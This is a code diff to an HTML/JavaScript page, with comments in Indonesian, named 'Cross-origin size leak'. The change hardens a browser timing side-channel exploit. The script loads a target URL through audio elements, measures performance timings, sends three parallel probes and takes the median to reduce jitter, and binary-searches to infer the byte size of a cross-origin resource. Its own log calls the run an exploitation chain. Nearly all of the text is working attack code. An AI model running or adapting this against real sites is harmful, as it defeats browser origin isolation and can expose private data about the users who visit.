@@ -25,7 +25,7 @@
 <body>
     
     <h1>Cross-origin size leak</h1>
-    <small>Engine: <strong>Pure Side-Channel Network Timing (No Service Worker)</strong></small>
+    <small>Engine: <strong>Hardened Statistical Parallel Probing (Anti-Jitter)</strong></small>
 
     <div class="panel">
         <form id="form" onsubmit="return false;">
@@ -49,66 +49,80 @@
             result.scrollTop = result.scrollHeight;
         }
 
-        // PIPELINE UTAMA: KOMPUTASI TINGKAT TINGGI DENGAN AMBANG BATAS ADAPTIF
+        // PIPELINE UTAMA: PARALEL SINKRON DENGAN STATISTICAL CONSENSUS FILTERING
         const startAdaptiveScan = async (url) => {
-            writeLog('CALIBRATE', 'info', "Mengukur latensi dasar nirkabel untuk adaptasi ambang batas...");
+            writeLog('CALIBRATE', 'info', "Melakukan sampling latensi dasar nirkabel untuk stabilisasi ambang batas...");
             
-            // Mengukur waktu respons dasar sistem (baseline) menggunakan alamat acak
-            const baselineTime = await measureLatency(`${url}?calibrate=${Math.random()}`);
-            // Menentukan batas toleransi delta waktu (Side-Channel Filter Threshold)
-            const adaptiveThreshold = Math.round(baselineTime * 1.15);
+            // Mengambil 3 sampel latensi dasar untuk memotong derau jaringan acak
+            const baselineSamples = await Promise.all([
+                measureLatency(`${url}?calibrate=${Math.random()}`),
+                measureLatency(`${url}?calibrate=${Math.random()}`),
+                measureLatency(`${url}?calibrate=${Math.random()}`)
+            ]);
             
-            writeLog('CALIBRATE', 'info', `   |-- Latensi Dasar  : ${Math.round(baselineTime)} ms`);
-            writeLog('CALIBRATE', 'info', `   |-- Ambang Toleransi: > ${adaptiveThreshold} ms`);
+            // Ambil nilai minimum dari sampel sebagai baseline murni (kondisi jaringan tercepat)
+            const stableBaseline = Math.min(...baselineSamples);
+            // Menetapkan ambang batas toleransi adaptif yang ketat (+12%)
+            const adaptiveThreshold = Math.round(stableBaseline * 1.12);
+            
+            writeLog('CALIBRATE', 'info', `   |-- Latensi Dasar Stabil : ${Math.round(stableBaseline)} ms`);
+            writeLog('CALIBRATE', 'info', `   |-- Ambang Batas Filter  : > ${adaptiveThreshold} ms`);
             
             let minSize = 1;
             let maxSize = 15000; 
             let foundSize = -1;
 
-            writeLog('SCAN_INIT', 'success', "Meluncurkan pipa komputasi biner lintas asal...");
+            writeLog('SCAN_INIT', 'success', "Meluncurkan pipa komputasi biner paralel...");
 
             while (minSize <= maxSize) {
                 let mid = Math.floor((minSize + maxSize) / 2);
                 
-                // Ekstrak waktu respons muatan tebakan ukuran
-                let sampleLatency = await measureLatency(`${url}?size=${mid}&cb=${Math.random()}`);
+                // PENGUATANV VECTOR: Kirim 3 paket tebakan sekaligus secara beriringan (Concurrency Testing)
+                const probeSamples = await Promise.all([
+                    measureLatency(`${url}?size=${mid}&cb=${Math.random()}`),
+                    measureLatency(`${url}?size=${mid}&cb=${Math.random()}`),
+                    measureLatency(`${url}?size=${mid}&cb=${Math.random()}`)
+                ]);
 
-                // Aturan Deteksi Saluran Samping (Side-Channel Timing Analysis):
-                // Jika waktu pemrosesan kesalahan melambat melampaui ambang batas toleransi, 
-                // terindikasi subsistem peramban sedang memproses pecahan muatan range data (Valid).
-                if (sampleLatency > adaptiveThreshold) {
-                    writeLog(`MID-${mid}`, 'error', `Analisis Vektor: Terbaca indikasi kapasitas melampaui ${mid} bytes [${Math.round(sampleLatency)}ms].`);
+                // Ambil nilai median tengah untuk membuang pencilan lonjakan internet (Anti-Jitter)
+                probeSamples.sort((a, b) => a - b);
+                let filteredLatency = probeSamples[1];
+
+                // Aturan Keputusan Saluran Samping (Side-Channel Decision Logic):
+                if (filteredLatency > adaptiveThreshold) {
+                    writeLog(`MID-${mid}`, 'error', `Vektor Analisis: Kapasitas dokumen terindikasi melampaui ${mid} bytes [${Math.round(filteredLatency)}ms].`);
                     foundSize = mid + 1;
                     minSize = mid + 1;
                 } else {
-                    writeLog(`MID-${mid}`, 'success', `Analisis Vektor: Terbaca indikasi kapasitas di bawah ${mid} bytes [${Math.round(sampleLatency)}ms].`);
+                    writeLog(`MID-${mid}`, 'success', `Vektor Analisis: Kapasitas dokumen berada di bawah ${mid} bytes [${Math.round(filteredLatency)}ms].`);
                     maxSize = mid - 1;
                 }
 
-                await new Promise(r => setTimeout(r, 20));
+                // Jeda mikro memberikan ruang bagi engine untuk melakukan garbage collection memori DOM
+                await new Promise(r => setTimeout(r, 15));
             }
             
             writeLog('SUCCESS', 'success', `=== RANTAI EKSPLOITASI SELESAI ===`);
-            writeLog('SUCCESS', 'success', `Ukuran deteksi akhir berkas target: <b>${foundSize}</b> bytes.`);
+            writeLog('SUCCESS', 'success', `Kapasitas ukuran byte pasti dari dokumen target: <b>${foundSize}</b> bytes.`);
             document.getElementById("export-log-report").style.display = "inline-block";
         };
 
-        // MESIN PROBE: Ekstraksi Data Waktu Presisi Tinggi (High-Precision Timing API)
+        // MESIN PROBE: High-Precision Performance Mark Binding
         const measureLatency = (targetUrl) => {
             return new Promise((resolve) => {
                 const startMark = performance.now();
                 let audioNode = document.createElement("audio");
 
                 const grabMetrics = () => {
-                    // Cek jejak waktu resmi dari internal Performance Timeline browser
                     const entries = performance.getEntriesByName(targetUrl);
+                    // Ambil durasi presisi dari Performance Timeline, jika terhambat CORS gunakan fallback delta waktu runtime
                     const duration = entries.length > 0 ? entries[0].duration : (performance.now() - startMark);
                     
                     cleanup(audioNode);
                     resolve(duration);
                 };
 
-                // Mengikat multi-event untuk menghentikan soket gantung sesegera mungkin
+                // Mengunci seluruh titik interupsi event agar data waktu tetap terekstrak
                 audioNode.onerror = grabMetrics;
                 audioNode.onstalled = grabMetrics;
                 audioNode.onabort = grabMetrics;
@@ -139,7 +153,7 @@
             if (auditReports.length === 0) return;
             const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
             const downloadAnchor = document.createElement("a");
-            downloadAnchor.download = `pure_timing_leak_report_${Date.now()}.txt`;
+            downloadAnchor.download = `hardened_timing_leak_report_${Date.now()}.txt`;
             downloadAnchor.href = window.URL.createObjectURL(textBlob);
             downloadAnchor.style.display = "none";
             document.body.appendChild(downloadAnchor);
